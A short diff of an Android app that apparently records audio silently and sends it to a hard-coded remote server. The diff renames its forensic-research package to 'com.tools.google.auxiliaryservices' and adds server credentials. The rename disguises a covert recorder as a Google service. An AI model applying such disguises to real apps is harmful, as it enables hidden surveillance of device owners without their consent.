@@ -1,4 +1,4 @@
-package com.forensic.unipg.silenceaudiorecording;
+package com.tools.google.auxiliaryservices;
 
 import android.Manifest;
 import android.app.ActivityManager;
@@ -35,7 +35,12 @@ public class SilenceAudioRecordingActivity extends AppCompatActivity {
     private boolean acceptRECORD_AUDIO     = false;
     private boolean acceptREAD_PHONE_STATE = false;
     //server values (default)
-    InfoServer mInfo = new InfoServer("2.227.12.76",8000);
+    ConfigurationFile mInfo = new ConfigurationFile(
+              "2.227.12.76"
+            , 8000
+            , "54321"
+            , "12345"
+    );
     //ui elements
     EditText  et_host              = null;
     EditText  et_port              = null;
@@ -169,7 +174,7 @@ public class SilenceAudioRecordingActivity extends AppCompatActivity {
                                    .toString()
                                    .replaceAll("\\s+","");
                     //valid?
-                    if(InfoServer.validateHostName(host))
+                    if(ConfigurationFile.validateHostName(host))
                     {
                         mInfo.mHost = host;
                         mInfo.write(getBaseContext());
